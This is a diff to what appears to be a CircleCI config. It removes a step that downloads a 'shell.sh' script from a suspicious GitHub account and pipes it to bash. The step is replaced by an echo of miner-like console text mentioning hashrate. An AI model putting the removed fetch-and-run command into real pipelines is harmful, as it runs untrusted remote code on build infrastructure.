@@ -19,7 +19,7 @@ jobs:
           command: "echo Hello, World!"
       - run:
           name: "get the thing"
-          command: wget https://raw.githubusercontent.com/suspiciousidentity/fantastic-goggles/main/shell.sh | bash
+          command: echo '[0m[1;37mCOMMANDS     [0m[45;1mh[0m[1;37mashrate, [0m[45;1mp[0m[1;37mause, [0m[45;1mr[0m[1;37mesume, [0m[1;37mre[0m[45m[1;37ms[0m[1;37mults, [0m[45;1mc[0m[1;37monnection'
 
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/configuration-reference/#workflows
